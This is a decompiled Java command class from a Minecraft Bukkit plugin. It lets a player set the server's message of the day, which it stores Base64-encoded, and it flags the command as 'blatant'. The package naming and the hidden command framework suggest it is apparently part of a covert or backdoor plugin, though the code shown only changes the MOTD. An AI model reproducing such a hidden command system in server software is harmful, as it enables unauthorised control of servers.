/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.data.DataManager;
import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import java.util.Base64;
import org.bukkit.entity.Player;

public class SetmotdCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length <= 1) {
            p2.sendMessage(Settings.USAGE("setmotd <message>"));
        } else {
            StringBuilder chat = new StringBuilder();
            for (int i2 = 1; i2 != args.length; ++i2) {
                chat.append(args[i2]).append(" ");
            }
            byte[] motd = Base64.getEncoder().encode(chat.toString().getBytes());
            DataManager.getData().set("mt", (Object)new String(motd));
            DataManager.saveData();
            p2.sendMessage(Settings.PREFIX("The new MOTD is " + Settings.RED + chat));
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

